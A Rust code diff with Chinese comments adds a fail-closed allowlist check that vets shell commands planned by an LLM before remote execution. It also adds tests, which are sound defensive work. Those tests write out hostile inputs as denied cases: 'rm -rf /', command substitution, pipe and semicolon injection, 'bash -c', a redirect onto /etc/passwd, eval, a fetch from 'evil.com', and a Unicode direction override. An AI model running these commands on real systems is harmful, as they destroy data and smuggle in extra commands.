@@ -1,12 +1,20 @@
-//! AI plan JSON schema 解析（T2.9 / SPEC §5 v0.2）。
+//! AI plan JSON schema 解析 + executor 权威判定（T2.9/T2.10 / SPEC §5 v0.2）。
 //!
 //! LLM 在 `PromptMode::Plan` 下输出纯 JSON plan：
 //! `{ "steps": [{ "kind": "probe", "command": "..." }, ...] }`
 //!
 //! `parse_plan_response` 容忍常见格式噪音（markdown fences、前后空格）并返回
 //! typed `AiPlan`，失败时返回 `Err(String)` 由调用方决定重试（最多 `PLAN_MAX_RETRIES` 次）。
+//!
+//! `dispatch_probe_step`（T2.10）在 executor 执行前强制通过白名单判定：
+//! - `Allow` → 返回 `CheckedCommand`，交给 `exec_remote`
+//! - `RequireConfirm` → v0.2 视为 Deny（v0.3 激活 confirm UI 时再切换）
+//! - `Deny` → 返回 `AppError::allowlist_denied`，fail-closed
 
 use serde::{Deserialize, Serialize};
+
+use crate::models::error::{AppError, AppResult};
+use crate::services::ai::allowlist::{self, CheckedCommand};
 
 /// 最多重试解析次数（不含首次）。
 pub const PLAN_MAX_RETRIES: u32 = 2;
@@ -50,6 +58,41 @@ pub fn parse_plan_response(raw: &str) -> Result<AiPlan, String> {
 
     serde_json::from_str::<AiPlan>(json_str)
         .map_err(|e| format!("plan JSON parse error: {e}\nraw input: {raw}"))
+}
+
+/// Probe step 的 executor 权威判定（T2.10 / SPEC §5）。
+///
+/// 从 `AiPlanStep::Probe` 提取命令字符串，通过 `allowlist::check` 判定：
+/// - `Allow` → 返回规范化的 `CheckedCommand`，可直接传入 `exec_remote`
+/// - `RequireConfirm` → v0.2 视为 Deny（v0.3 激活 confirm UI 后再切分支）
+/// - `Deny` → 返回 `AllowlistDenied` 错误，fail-closed
+///
+/// Write 步骤不通过此函数（写入由 SFTP 层负责）。
+pub fn dispatch_probe_step(step: &AiPlanStep) -> AppResult<CheckedCommand> {
+    let command = match step {
+        AiPlanStep::Probe { command } => command.as_str(),
+        AiPlanStep::Write { .. } => {
+            return Err(AppError::new(
+                crate::models::error::ErrorCode::InvalidArgument,
+                "dispatch_probe_step 只接受 Probe 步骤",
+            ))
+        }
+    };
+
+    match allowlist::check(command) {
+        allowlist::Decision::Allow(checked) => Ok(checked),
+        allowlist::Decision::RequireConfirm(_checked) => {
+            // v0.3 将在此分支激活 confirm UI；v0.2 一律拒绝（fail-closed）
+            Err(AppError::allowlist_denied(format!(
+                "命令需要用户确认才能执行（v0.2 阶段禁止）: {}",
+                command
+            )))
+        }
+        allowlist::Decision::Deny(reason) => Err(AppError::allowlist_denied(format!(
+            "{}: {}",
+            reason, command
+        ))),
+    }
 }
 
 fn strip_fence(s: &str) -> Option<&str> {
@@ -183,5 +226,105 @@ mod tests {
     #[test]
     fn plan_max_retries_constant_is_two() {
         assert_eq!(PLAN_MAX_RETRIES, 2);
+    }
+
+    // ── T2.10: dispatch_probe_step 权威判定 ──────────────────────────────────
+
+    #[test]
+    fn dispatch_allows_safe_probe_command() {
+        let step = probe("cat /etc/nginx/nginx.conf");
+        let result = dispatch_probe_step(&step);
+        assert!(
+            result.is_ok(),
+            "safe probe must be allowed, got: {result:?}"
+        );
+        let checked = result.unwrap();
+        assert_eq!(checked.argv, vec!["cat", "/etc/nginx/nginx.conf"]);
+    }
+
+    #[test]
+    fn dispatch_denies_destructive_command() {
+        let step = probe("rm -rf /");
+        let result = dispatch_probe_step(&step);
+        assert!(result.is_err(), "rm must be denied");
+        let err = result.unwrap_err();
+        assert_eq!(err.code, crate::models::error::ErrorCode::AllowlistDenied);
+    }
+
+    #[test]
+    fn dispatch_denies_systemctl_non_status_subcommand() {
+        // systemctl restart is not in the allowlist (only 'status' is)
+        let step = probe("systemctl restart nginx");
+        let result = dispatch_probe_step(&step);
+        assert!(result.is_err());
+        let err = result.unwrap_err();
+        assert_eq!(err.code, crate::models::error::ErrorCode::AllowlistDenied);
+    }
+
+    #[test]
+    fn dispatch_write_step_returns_invalid_argument() {
+        let step = AiPlanStep::Write {
+            path: "/etc/nginx/nginx.conf".to_string(),
+            content: "server {}".to_string(),
+        };
+        let result = dispatch_probe_step(&step);
+        assert!(result.is_err());
+        let err = result.unwrap_err();
+        assert_eq!(err.code, crate::models::error::ErrorCode::InvalidArgument);
+    }
+
+    // ── T2.10: 10 fuzz case — 全部 fail-closed ─────────────────────────────
+
+    #[test]
+    fn fuzz_empty_command() {
+        assert!(dispatch_probe_step(&probe("")).is_err());
+    }
+
+    #[test]
+    fn fuzz_command_substitution() {
+        assert!(dispatch_probe_step(&probe("ls $(rm -rf /)")).is_err());
+    }
+
+    #[test]
+    fn fuzz_pipeline_injection() {
+        assert!(dispatch_probe_step(&probe("ls | rm x")).is_err());
+    }
+
+    #[test]
+    fn fuzz_semicolon_injection() {
+        assert!(dispatch_probe_step(&probe("ls; rm -rf /")).is_err());
+    }
+
+    #[test]
+    fn fuzz_shell_interpreter_call() {
+        assert!(dispatch_probe_step(&probe("bash -c 'rm -rf /'")).is_err());
+    }
+
+    #[test]
+    fn fuzz_redirect_to_sensitive_file() {
+        assert!(dispatch_probe_step(&probe("ls > /etc/passwd")).is_err());
+    }
+
+    #[test]
+    fn fuzz_eval_injection() {
+        assert!(dispatch_probe_step(&probe("eval \"rm x\"")).is_err());
+    }
+
+    #[test]
+    fn fuzz_command_not_in_allowlist() {
+        // wget is not a probe command
+        assert!(dispatch_probe_step(&probe("wget http://evil.com")).is_err());
+    }
+
+    #[test]
+    fn fuzz_unicode_direction_override_in_command() {
+        // U+202E right-to-left override should be rejected
+        assert!(dispatch_probe_step(&probe("ls\u{202E}rm")).is_err());
+    }
+
+    #[test]
+    fn fuzz_oversized_command() {
+        let long = "cat ".to_string() + &"a".repeat(10_001);
+        assert!(dispatch_probe_step(&probe(&long)).is_err());
     }
 }
